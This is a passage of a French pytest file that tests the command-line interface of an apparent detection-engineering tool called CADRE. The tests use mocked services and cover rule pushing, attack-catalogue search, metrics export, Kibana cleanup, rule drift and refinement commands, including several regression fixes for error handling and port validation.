        resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001", "--forcer"])
        assert resultat.exit_code == 0
        assert forcer_recus == [True]
        assert "forcée" in resultat.output


class TestCommandeRechercher:
    """`cadre rechercher` -- recherche par mot-clé (catalogue + Atomic Red
    Team), avec repli optionnel sur la découverte IA (toujours en revue)."""

    def test_trouve_dans_le_catalogue(self, runner, tmp_path, monkeypatch):
        attaque_id = CATALOGUE[0].id
        mot = CATALOGUE[0].technique_mitre
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["rechercher", mot, "--sans-atomic"])
        assert resultat.exit_code == 0
        assert attaque_id in resultat.output

    def test_rien_trouve_sans_decouvrir_suggere_la_commande(self, runner, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic"])
        assert resultat.exit_code == 0
        assert "Rien trouvé" in resultat.output
        assert "cadre decouvrir" in resultat.output

    def test_rien_trouve_avec_decouvrir_appelle_lia_en_revue(self, runner, monkeypatch, tmp_path):
        captures = []

        def decouvrir_qui_capture(orchestrateur, descriptions, techniques=None, revue=False):
            captures.append({"descriptions": descriptions, "revue": revue})
            return {"decouvertes": [], "refusees": [], "echecs": []}

        monkeypatch.setattr("cadre.decouverte_ia.decouvrir_attaques", decouvrir_qui_capture)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(
            cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic", "--decouvrir"]
        )
        assert resultat.exit_code == 0
        assert captures == [{"descriptions": ["xyzzy-introuvable"], "revue": True}]

    def test_sans_decouvrir_ne_declenche_jamais_lia(self, runner, monkeypatch, tmp_path):
        def decouvrir_qui_leve(*a, **k):
            raise AssertionError("ne doit pas être appelé sans --decouvrir")

        monkeypatch.setattr("cadre.decouverte_ia.decouvrir_attaques", decouvrir_qui_leve)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic"])
        assert resultat.exit_code == 0

    def test_decouvrir_verrou_actif_message_clair(self, runner, monkeypatch, tmp_path):
        """Régression (audit) : VerrouCycleActifError levée par
        decouvrir_attaques() (repli --decouvrir) n'était pas rattrapée --
        traceback Python brute au lieu d'un message clair."""
        from cadre.orchestrateur import VerrouCycleActifError

        def leve_verrou(*a, **k):
            raise VerrouCycleActifError("cycle déjà en cours (verrou tenu par PID 4242)")

        monkeypatch.setattr("cadre.decouverte_ia.decouvrir_attaques", leve_verrou)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(
            cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic", "--decouvrir"]
        )
        assert resultat.exit_code != 0
        assert resultat.exception is None or isinstance(resultat.exception, SystemExit)
        assert "déjà en cours" in resultat.output


class TestCommandeDecouvrir:
    def test_verrou_actif_message_clair(self, runner, monkeypatch, tmp_path):
        """Régression (audit) : VerrouCycleActifError levée par
        decouvrir_attaques() (import différé dans decouvrir()) n'était pas
        rattrapée -- traceback Python brute au lieu d'un message clair."""
        from cadre.orchestrateur import VerrouCycleActifError

        def leve_verrou(*a, **k):
            raise VerrouCycleActifError("cycle déjà en cours (verrou tenu par PID 4242)")

        monkeypatch.setattr("cadre.decouverte_ia.decouvrir_attaques", leve_verrou)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["decouvrir", "-d", "test"])
        assert resultat.exit_code != 0
        assert resultat.exception is None or isinstance(resultat.exception, SystemExit)
        assert "déjà en cours" in resultat.output


class TestCommandeSuggest:
    def test_suggestion_reussie(self, runner, monkeypatch):
        class AssistantFactice:
            modele = "llama3.1:8b"
            url = "http://127.0.0.1:11434"

            def suggerer_attaque(self, description, technique_mitre=None):
                return {
                    "nom": "Test",
                    "technique_mitre": technique_mitre or "T1059.001",
                    "brouillon_ia": True,
                }

        monkeypatch.setattr("cadre.assistant_llm.obtenir_assistant_llm", AssistantFactice)
        resultat = runner.invoke(cli, ["suggest", "--description", "commande suspecte"])
        assert resultat.exit_code == 0
        assert "BROUILLON IA" in resultat.output
        assert "T1059.001" in resultat.output

    def test_suggestion_avec_fichier_sortie(self, runner, monkeypatch, tmp_path):
        class AssistantFactice:
            modele = "llama3.1:8b"
            url = "http://127.0.0.1:11434"

            def suggerer_attaque(self, description, technique_mitre=None):
                return {"nom": "Test", "brouillon_ia": True}

        monkeypatch.setattr("cadre.assistant_llm.obtenir_assistant_llm", AssistantFactice)
        sortie = tmp_path / "brouillon.json"
        resultat = runner.invoke(
            cli,
            ["suggest", "--description", "commande suspecte", "--output", str(sortie)],
        )
        assert resultat.exit_code == 0
        assert sortie.exists()
        assert "brouillon_ia" in sortie.read_text(encoding="utf-8")

    def test_suggestion_echec_ollama(self, runner, monkeypatch):
        class AssistantFactice:
            modele = "llama3.1:8b"
            url = "http://127.0.0.1:11434"

            def suggerer_attaque(self, description, technique_mitre=None):
                return None

        monkeypatch.setattr("cadre.assistant_llm.obtenir_assistant_llm", AssistantFactice)
        resultat = runner.invoke(cli, ["suggest", "--description", "commande suspecte"])
        assert resultat.exit_code == 1
        assert "Échec" in resultat.output


class TestCommandeStatus:
    def test_services_ok(self, runner, monkeypatch, tmp_path):
        class ReponseFactice:
            status_code = 200

        monkeypatch.setattr("requests.get", lambda *a, **k: ReponseFactice())
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["status"])
        assert resultat.exit_code == 0
        assert "Elasticsearch" in resultat.output
        assert "OK" in resultat.output

    def test_services_injoignables(self, runner, monkeypatch, tmp_path):
        def get_qui_echoue(*args, **kwargs):
            raise ConnectionError("connexion refusée")

        monkeypatch.setattr("requests.get", get_qui_echoue)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["status"])
        assert resultat.exit_code == 0
        assert "connexion refusée" in resultat.output


class TestCommandeRapport:
    def test_soutenance(self, runner, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["rapport", "--soutenance"])
        assert resultat.exit_code == 0
        assert (tmp_path / "RAPPORT_PFA_CADRE.md").exists()

    def test_sans_option(self, runner):
        """Régression (audit) « rapport mort » : cette branche affichait
        "Génération des rapports en cours..." (message trompeur) puis ne
        faisait RIEN -- jamais implémentée. Doit maintenant orienter
        honnêtement vers la vraie source (fin de `cadre cycle`)."""
        resultat = runner.invoke(cli, ["rapport"])
        assert resultat.exit_code == 0
        assert "Génération des rapports en cours" not in resultat.output
        assert "cadre cycle" in resultat.output
        assert "cadre rapport --soutenance" in resultat.output


class TestCommandeLoop:
    def test_loop_max_cycles(self, runner, monkeypatch):
        appels = {}

        class BoucleFactice:
            def __init__(self, **kwargs):
                appels["init_kwargs"] = kwargs

            def demarrer(self, max_cycles=None):
                appels["max_cycles"] = max_cycles
                return {"total_cycles": 1, "validees": 2}

        monkeypatch.setattr("cadre.boucle.BoucleAutomatisee", BoucleFactice)
        resultat = runner.invoke(cli, ["loop", "--max-cycles", "1", "--intervalle", "5"])
        assert resultat.exit_code == 0
        assert appels["max_cycles"] == 1
        assert appels["init_kwargs"]["intervalle_sec"] == 5
        assert "total_cycles" in resultat.output


class TestCommandeDaemon:
    def test_pidfile_processus_mort_sous_windows_narrete_pas_avant_le_nettoyage(
        self, runner, monkeypatch, tmp_path
    ):
        """Le nettoyage du PID file mort a lieu AVANT le branchement par
        plateforme -- doit s'exécuter (et être journalisé) même sur Windows,
        où la commande s'arrête juste après (voir test dédié ci-dessous)."""
        monkeypatch.setattr("sys.platform", "win32")
        pidfile = tmp_path / "cadre.pid"
        pidfile.write_text("99999")

        def kill_echoue(pid, sig):
            raise OSError("processus introuvable")

        monkeypatch.setattr("os.kill", kill_echoue)
        resultat = runner.invoke(cli, ["daemon", "--pidfile", str(pidfile)])
        assert "mort" in resultat.output
        assert not pidfile.exists()  # nettoyé

    def test_pidfile_contenu_non_numerique_narrete_pas_avec_une_trace_brute(
        self, runner, monkeypatch, tmp_path
    ):
        """Régression (audit) : un fichier PID au contenu non numérique (vide,
        tronqué par un crash précédent, édité à la main) faisait planter
        `int(...)` avec une ValueError non rattrapée -- traceback Python brut
        au lieu du message "nettoyage" déjà prévu pour un PID mort. Un
        fichier illisible doit être traité comme obsolète : nettoyé, la
        commande continue proprement (ici jusqu'au message Windows)."""
        monkeypatch.setattr("sys.platform", "win32")
        pidfile = tmp_path / "cadre.pid"
        pidfile.write_text("pas-un-pid\n")

        resultat = runner.invoke(cli, ["daemon", "--pidfile", str(pidfile)])

        assert not isinstance(resultat.exception, ValueError)
        assert "illisible" in resultat.output
        assert not pidfile.exists()  # nettoyé
        assert resultat.exit_code == 1
        assert "non supporté" in resultat.output

    def test_pidfile_processus_vivant(self, runner, monkeypatch, tmp_path):
        pidfile = tmp_path / "cadre.pid"
        pidfile.write_text("1")

        monkeypatch.setattr("os.kill", lambda pid, sig: None)
        resultat = runner.invoke(cli, ["daemon", "--pidfile", str(pidfile)])
        assert resultat.exit_code == 1
        assert "tourne déjà" in resultat.output

    def test_sous_windows_narrive_jamais_a_lancer_la_vraie_boucle(
        self, runner, monkeypatch, tmp_path
    ):
        """Régression sécurité (audit) : « cadre daemon sous Windows lance
        quand même la boucle réelle » -- le message "non supporté sur
        Windows" n'était suivi d'aucun sys.exit()/return, et l'exécution
        continuait tout droit vers le lancement de la VRAIE boucle
        (attaques réelles répétées contre la cible configurée, jamais du
        simulé), au premier plan, en contradiction totale avec le message
        qui vient d'être affiché à l'utilisateur."""
        monkeypatch.setattr("sys.platform", "win32")
        pidfile = tmp_path / "cadre.pid"

        def boucle_qui_leve(**kwargs):
            raise AssertionError(
                "la vraie boucle ne doit JAMAIS démarrer sur Windows via `cadre daemon`"
            )

        monkeypatch.setattr("cadre.boucle.BoucleAutomatisee", boucle_qui_leve)
        resultat = runner.invoke(cli, ["daemon", "--pidfile", str(pidfile)])
        # Discriminant : Click capture TOUTE exception non gérée (y compris
        # l'AssertionError levée si boucle_qui_leve était atteinte) avec le
        # même exit_code=1 -- le message "non supporté" est lui aussi déjà
        # affiché par l'ancien code bogué avant la chute. La seule preuve que
        # boucle_qui_leve n'a JAMAIS été appelée est l'absence d'AssertionError :
        # un SystemExit(1) (sys.exit propre, mon correctif) est attendu et OK,
        # mais surtout PAS l'AssertionError du mock (= la boucle a été atteinte).
        assert not isinstance(resultat.exception, AssertionError)
        assert resultat.exit_code == 1
        assert "non supporté" in resultat.output
        assert not pidfile.exists()  # jamais écrit (aucun processus daemon réellement lancé)


class TestCommandeMetrics:
    def test_demarrage_et_arret_propre(self, runner, monkeypatch, tmp_path):
        class ServeurFactice:
            def __init__(self, adresse, handler):
                self.adresse = adresse
                self.handler = handler

            def serve_forever(self):
                raise KeyboardInterrupt

            def shutdown(self):
                pass

        monkeypatch.setattr("http.server.ThreadingHTTPServer", ServeurFactice)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["metrics", "--port", "9999"])
        assert resultat.exit_code == 0
        assert "9999" in resultat.output
        assert "Arrêt du serveur" in resultat.output

    def test_port_hors_plage_refuse_proprement(self, runner, monkeypatch, tmp_path):
        """Régression (audit) : `--port` n'était jamais validé -- un port
        hors plage (0-65535) passait le typage entier de click puis
        plantait dans ThreadingHTTPServer() avec un OverflowError/OSError
        incompréhensible au lieu d'un message clair."""

        def serveur_qui_ne_doit_jamais_etre_appele(*a, **k):
            raise AssertionError("ThreadingHTTPServer ne doit jamais être instancié")

        monkeypatch.setattr(
            "http.server.ThreadingHTTPServer", serveur_qui_ne_doit_jamais_etre_appele
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["metrics", "--port", "99999"])
        assert resultat.exit_code != 0
        assert not isinstance(resultat.exception, AssertionError)
        assert "invalide" in resultat.output.lower()

    def test_helper_relit_le_cumulatif_a_chaque_appel(self, tmp_path):
        """`_texte_metriques_prometheus` doit refléter le contenu du fichier
        tel qu'il est AU MOMENT de l'appel (pas un instantané mis en cache
        en interne) -- condition nécessaire pour que le câblage HTTP
        (test suivant) puisse exposer des valeurs à jour à chaque scrape."""
        from cadre.cli import _texte_metriques_prometheus

        chemin = tmp_path / "cadre_cumulatif.json"
        chemin.write_text('{"total_cycles": 1, "validees": 1}', encoding="utf-8")
        premier = _texte_metriques_prometheus(chemin)
        assert "cadre_cycles_total 1\n" in premier
        assert "cadre_validees_total 1\n" in premier

        # Un cycle `cadre loop` de plus tourne entre-temps et réécrit le
        # fichier -- le serveur HTTP, lui, reste le même process.
        chemin.write_text('{"total_cycles": 4, "validees": 3}', encoding="utf-8")
        second = _texte_metriques_prometheus(chemin)
        assert "cadre_cycles_total 4\n" in second
        assert "cadre_validees_total 3\n" in second

    def test_do_get_relit_a_chaque_requete_pas_seulement_au_demarrage(
        self, runner, monkeypatch, tmp_path
    ):
        """Régression (audit) : `stats` était lu UNE SEULE FOIS à l'appel de
        `cadre metrics` (avant l'instanciation du handler HTTP), puis capturé
        par fermeture (closure) et réutilisé tel quel pour CHAQUE requête
        /metrics servie ensuite -- potentiellement des jours, si lancé à côté
        de `cadre loop`/`cadre daemon` en service. Or ces deux commandes
        réécrivent cadre_cumulatif.json après CHAQUE cycle : les compteurs
        Prometheus exportés restaient donc figés à l'instantané pris au
        démarrage du serveur de métriques, quel que soit le nombre de cycles
        réels exécutés depuis (un `rate()` PromQL dessus resterait à 0 pour
        toujours). Vérifie directement le câblage de `do_GET` : capture la
        classe `MetricsHandler` réellement construite par la commande, puis
        l'appelle deux fois -- `_texte_metriques_prometheus` (mocké, compte
        ses appels) doit être invoqué à CHAQUE fois, pas une seule fois en
        amont."""
        import io
        from types import SimpleNamespace

        handler_capture: dict[str, type] = {}

        class ServeurFactice:
            def __init__(self, adresse, handler):
                handler_capture["classe"] = handler

            def serve_forever(self):
                raise KeyboardInterrupt

            def shutdown(self):
                pass

        monkeypatch.setattr("http.server.ThreadingHTTPServer", ServeurFactice)

        appels = []

        def _texte_factice(chemin):
            appels.append(chemin)
            return f"cadre_cycles_total {len(appels)}\n"

        monkeypatch.setattr("cadre.cli._texte_metriques_prometheus", _texte_factice)

        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["metrics", "--port", "9999"])
        assert resultat.exit_code == 0

        gestionnaire = handler_capture["classe"]
        for _ in range(2):
            faux_self = SimpleNamespace(
                path="/metrics",
                send_response=lambda *a: None,
                send_header=lambda *a: None,
                end_headers=lambda: None,
                wfile=io.BytesIO(),
            )
            gestionnaire.do_GET(faux_self)

        # Deux requêtes HTTP -> deux relectures fraîches du fichier cumulatif
        # (et non une seule lecture faite une fois pour toutes au démarrage).
        assert len(appels) == 2


class TestCommandeMetriques:
    """`cadre metriques` -- non testée directement au niveau CLI avant ce lot."""

    def test_aucun_cycle_trouve(self, runner, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["metriques"])
        assert resultat.exit_code == 0
        assert "Aucun cycle trouvé" in resultat.output

    def test_affiche_les_indicateurs(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr(
            "cadre.metriques.metriques_dernier_cycle",
            lambda repertoire: {
                "regles_produites": 5,
                "taux_reussite_pct": 100.0,
                "applicables": 5,
                "temps_gagne_heures": 8.0,
                "temps_gagne_jours_ouvres": 1.0,
                "tactiques_couvertes": 3,
                "total_tactiques_catalogue": 11,
                "couverture_tactiques_pct": 27.3,
                "faux_positifs_median": 4.0,
                "hypothese_heures_par_regle": 1.6,
            },
        )
        monkeypatch.chdir(tmp_path)
        Path("rapports").mkdir(parents=True, exist_ok=True)
        Path("rapports/cycle_20260101_000000.csv").write_text("timestamp\n", encoding="utf-8")
        resultat = runner.invoke(cli, ["metriques"])
        assert resultat.exit_code == 0
        assert "5" in resultat.output
        assert "8.0" in resultat.output

    def test_cumul_sans_fichier_cumulatif(self, runner, tmp_path, monkeypatch):
        """--cumul nécessite cadre_cumulatif.json (alimenté par `cadre loop`,
        pas `cadre cycle`) -- message clair plutôt qu'une erreur si absent."""
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["metriques", "--cumul"])
        assert resultat.exit_code == 0
        assert "Aucun cumulatif trouvé" in resultat.output

    def test_cumul_affiche_le_temps_gagne_cumule(self, runner, tmp_path, monkeypatch):
        """Régression : calculer_tendance_cumulative() était testée
        unitairement mais jamais appelée par aucun code de production --
        cette métrique n'était exposée nulle part."""
        monkeypatch.chdir(tmp_path)
        Path("rapports").mkdir(parents=True, exist_ok=True)
        Path("rapports/cadre_cumulatif.json").write_text(
            '{"total_cycles": 3, "total_attaques": 12, "validees": 10}',
            encoding="utf-8",
        )
        resultat = runner.invoke(cli, ["metriques", "--cumul"])
        assert resultat.exit_code == 0
        assert "3" in resultat.output  # total_cycles
        assert "16.0" in resultat.output  # 10 * 1.6h/règle (HEURES_PAR_REGLE_MANUELLE)


class TestCommandeNettoyerKibana:
    """`cadre nettoyer-kibana` -- suppression des règles orphelines. Mocke
    l'orchestrateur pour ne jamais toucher un vrai Kibana."""

    def _mock_orch(self, monkeypatch, resultat):
        class OrchFactice:
            def __init__(self, *a, **k):
                pass

            def nettoyer_regles_orphelines_kibana(self, appliquer=False):
                self.appliquer = appliquer
                return resultat

        instances = []

        def _fabrique(*a, **k):
            o = OrchFactice()
            instances.append(o)
            return o

        monkeypatch.setattr("cadre.cli.OrchestrateurCADRE", _fabrique)
        return instances

    def test_inventaire_par_defaut(self, runner, monkeypatch):
        instances = self._mock_orch(
            monkeypatch,
            {
                "total_cadre": 131,
                "stables": 71,
                "orphelines_sures": ["r"] * 60,
                "orphelines_preservees": [],
                "supprimees": 0,
            },
        )
        resultat = runner.invoke(cli, ["nettoyer-kibana"])
        assert resultat.exit_code == 0
        assert "60" in resultat.output
        assert instances[0].appliquer is False  # dry-run par défaut

    def test_appliquer_demande_confirmation_refusee(self, runner, monkeypatch):
        self._mock_orch(
            monkeypatch,
            {
                "total_cadre": 0,
                "stables": 0,
                "orphelines_sures": [],
                "orphelines_preservees": [],
                "supprimees": 0,
            },
        )
        # 'n' à la confirmation -> rien supprimé
        resultat = runner.invoke(cli, ["nettoyer-kibana", "--appliquer"], input="n\n")
        assert resultat.exit_code == 0
        assert "Annulé" in resultat.output

    def test_appliquer_confirme_supprime(self, runner, monkeypatch):
        self._mock_orch(
            monkeypatch,
            {
                "total_cadre": 131,
                "stables": 71,
                "orphelines_sures": ["r"] * 60,
                "orphelines_preservees": [],
                "supprimees": 60,
            },
        )
        resultat = runner.invoke(cli, ["nettoyer-kibana", "--appliquer"], input="y\n")
        assert resultat.exit_code == 0
        assert "60" in resultat.output

    def test_kibana_injoignable(self, runner, monkeypatch):
        self._mock_orch(
            monkeypatch,
            {
                "total_cadre": 0,
                "stables": 0,
                "orphelines_sures": [],
                "orphelines_preservees": [],
                "supprimees": 0,
                "erreur": "Kibana injoignable",
            },
        )
        resultat = runner.invoke(cli, ["nettoyer-kibana"])
        assert resultat.exit_code == 1
        assert "Kibana injoignable" in resultat.output


class TestCommandeDerive:
    """`cadre derive` -- détection de dérive d'une règle déjà validée, non
    testée directement au niveau CLI avant ce lot (seulement en réel à la main)."""

    def test_historique_insuffisant(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr(
            "cadre.metriques.detecter_derive_regle",
            lambda attaque_id, repertoire: {"statut": "INSUFFISANT", "nb_mesures": 0},
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
        assert resultat.exit_code == 0
        assert "Pas assez d'historique" in resultat.output

    def test_stable(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr(
            "cadre.metriques.detecter_derive_regle",
            lambda attaque_id, repertoire: {
                "statut": "STABLE",
                "nb_mesures": 2,
                "premiere": {"timestamp": "t1", "nb_tp": 1, "nb_fp": 5},
                "derniere": {"timestamp": "t2", "nb_tp": 1, "nb_fp": 6},
            },
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
        assert resultat.exit_code == 0
        assert "Stable" in resultat.output

    def test_perte_detection(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr(
            "cadre.metriques.detecter_derive_regle",
            lambda attaque_id, repertoire: {
                "statut": "PERTE_DETECTION",
                "nb_mesures": 2,
                "premiere": {"timestamp": "t1", "nb_tp": 1, "nb_fp": 5},
                "derniere": {"timestamp": "t2", "nb_tp": 0, "nb_fp": 0},
            },
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
        assert resultat.exit_code == 0
        assert "Perte de détection" in resultat.output

    def test_derive_bruit(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr(
            "cadre.metriques.detecter_derive_regle",
            lambda attaque_id, repertoire: {
                "statut": "DERIVE_BRUIT",
                "nb_mesures": 2,
                "premiere": {"timestamp": "t1", "nb_tp": 1, "nb_fp": 5},
                "derniere": {"timestamp": "t2", "nb_tp": 1, "nb_fp": 20},
            },
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
        assert resultat.exit_code == 0
        assert "Dérive de bruit" in resultat.output


class TestCommandeRaffiner:
    """`cadre raffiner` -- ajuste les paramètres de détection d'une attaque
    EXISTANTE sans en créer une nouvelle."""

    def test_attaque_introuvable(self, runner, monkeypatch, tmp_path):
        monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: None)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["raffiner", "CADRE-FAKE-999", "--seuil-fp", "10"])
        assert resultat.exit_code != 0
        assert "introuvable" in resultat.output

    def test_aucune_option_ne_fait_rien(self, runner, monkeypatch, exemple_attaque, tmp_path):
        monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id])
        assert resultat.exit_code == 0
        assert "Rien à raffiner" in resultat.output

    def test_enregistrement_reussi(self, runner, monkeypatch, exemple_attaque, tmp_path):
        appels = []
        monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
        monkeypatch.setattr(
            "cadre.raffinement.enregistrer_raffinement",
            lambda attaque_id, champs: appels.append((attaque_id, champs)),
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--seuil-fp", "15"])
        assert resultat.exit_code == 0
        assert appels == [(exemple_attaque.id, {"seuil_fp_max": 15})]
        assert "enregistré" in resultat.output

    def test_deux_options_combinees(self, runner, monkeypatch, exemple_attaque, tmp_path):
        appels = []
        monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
        monkeypatch.setattr(
            "cadre.raffinement.enregistrer_raffinement",
            lambda attaque_id, champs: appels.append((attaque_id, champs)),
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(
            cli,
            [
                "raffiner",
                exemple_attaque.id,
                "--valeur-detection",
                "NOUVEAU_MARQUEUR",
                "--seuil-fp",
                "15",
            ],
        )
        assert resultat.exit_code == 0
        assert appels == [
            (exemple_attaque.id, {"valeur_detection": "NOUVEAU_MARQUEUR", "seuil_fp_max": 15})
        ]

    def test_refus_remonte_a_l_utilisateur(self, runner, monkeypatch, exemple_attaque, tmp_path):
        from cadre.raffinement import ErreurRaffinement

        monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)

        def refuse(attaque_id, champs):
            raise ErreurRaffinement("seuil_fp_max doit être un entier strictement positif")

        monkeypatch.setattr("cadre.raffinement.enregistrer_raffinement", refuse)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--seuil-fp", "-5"])
        assert resultat.exit_code != 0
        assert "refusé" in resultat.output

    def test_reinitialiser_existant(self, runner, monkeypatch, exemple_attaque, tmp_path):
        monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
        monkeypatch.setattr("cadre.raffinement.supprimer_raffinement", lambda id_: True)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--reinitialiser"])
        assert resultat.exit_code == 0
        assert "retiré" in resultat.output

    def test_reinitialiser_sans_raffinement_actif(
        self, runner, monkeypatch, exemple_attaque, tmp_path
    ):
        monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
        monkeypatch.setattr("cadre.raffinement.supprimer_raffinement", lambda id_: False)
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--reinitialiser"])
        assert resultat.exit_code == 0
        assert "Aucun raffinement actif" in resultat.output


class TestCommandeDashboard:
    def test_demarrage_appelle_lancer_dashboard(self, runner, monkeypatch, tmp_path):
        appels = []
        monkeypatch.setattr(
            "cadre.dashboard.lancer_dashboard",
            lambda **kwargs: appels.append(kwargs),
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["dashboard", "--port", "8888"])
        assert resultat.exit_code == 0
        assert "8888" in resultat.output
        assert appels[0]["port"] == 8888
        assert appels[0]["bind"] == "127.0.0.1"

    def test_port_hors_plage_refuse_proprement(self, runner, monkeypatch, tmp_path):
        """Régression (audit) : même défaut que `cadre metrics --port` avant
        sa correction -- `--port` n'était jamais validé ici, un port hors
        plage (0-65535) passait le typage entier de click puis plantait
        dans ThreadingHTTPServer() (appelé par lancer_dashboard) avec un
        OverflowError/OSError brut au lieu d'un message clair. Les deux
        commandes ouvrent un ThreadingHTTPServer sur un port utilisateur --
        elles doivent se comporter pareil face à une entrée invalide."""

        def lancer_dashboard_qui_ne_doit_jamais_etre_appele(**kwargs):
            raise AssertionError("lancer_dashboard ne doit jamais être appelé")

        monkeypatch.setattr(
            "cadre.dashboard.lancer_dashboard", lancer_dashboard_qui_ne_doit_jamais_etre_appele
        )
        monkeypatch.chdir(tmp_path)
        resultat = runner.invoke(cli, ["dashboard", "--port", "99999"])
        assert resultat.exit_code != 0
        assert not isinstance(resultat.exception, AssertionError)
        assert "invalide" in resultat.output.lower()
